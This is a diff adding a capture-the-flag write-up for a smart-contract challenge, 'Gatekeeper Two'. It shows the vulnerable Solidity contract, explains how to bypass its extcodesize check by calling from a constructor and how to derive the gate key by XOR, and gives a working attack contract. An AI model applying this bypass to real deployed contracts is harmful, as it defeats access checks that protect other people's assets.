@@ -564,3 +564,58 @@ contract EntrantOne {
     }
 }
 ```
+
+# Level 14: Gatekeeper Two
+
+```
+contract GatekeeperTwo {
+    address public entrant;
+
+    modifier gateOne() {
+        require(msg.sender != tx.origin);
+        _;
+    }
+
+    modifier gateTwo() {
+        uint256 x;
+        assembly {
+            x := extcodesize(caller())
+        }
+        require(x == 0);
+        _;
+    }
+
+    modifier gateThree(bytes8 _gateKey) {
+        require(uint64(bytes8(keccak256(abi.encodePacked(msg.sender)))) ^ uint64(_gateKey) == type(uint64).max);
+        _;
+    }
+
+    function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
+        entrant = tx.origin;
+        return true;
+    }
+}
+```
+
+This is similar to the previous level. There are three checks that are made, the first being the same as before, ensuring that we forward the transaction through a deployed contract.
+
+The second check asserts that `extcodesize` of `caller` (which is the same as `msg.sender`) is zero. This is a naive check to try to ensure that the sender of the transaction is *not* a contract, but there's a way around this: `extcodesize` is zero during contract construction, so we just need to make this call during construction.
+
+The third check is another piece of bitwise logic. It takes the hash of the sender, XORs with the gate key, and this needs to be the max value for `uint64`. This max value would be all 1s, so we should be fine submitting a key that is the bitwise `NOT` of the same hash of the attack contract's address. We can actually get the same result by `XOR`ing with all 1s, as they do when the check the key, as the operation that `XOR`s with 1s is the inverse of itself.
+
+The following contract completes the level upon deployment.
+```
+contract EntrantTwo {
+    constructor(address gatekeeperAddress) {
+        bytes8 key = bytes8(uint64(bytes8(keccak256(abi.encodePacked(address(this))))) ^ type(uint64).max);
+        GatekeeperTwo(gatekeeperAddress).enter(key);
+    }
+}
+
+interface GatekeeperTwo {
+  function enter ( bytes8 _gateKey ) external returns ( bool );
+  function entrant (  ) external view returns ( address );
+}
+
+```
+
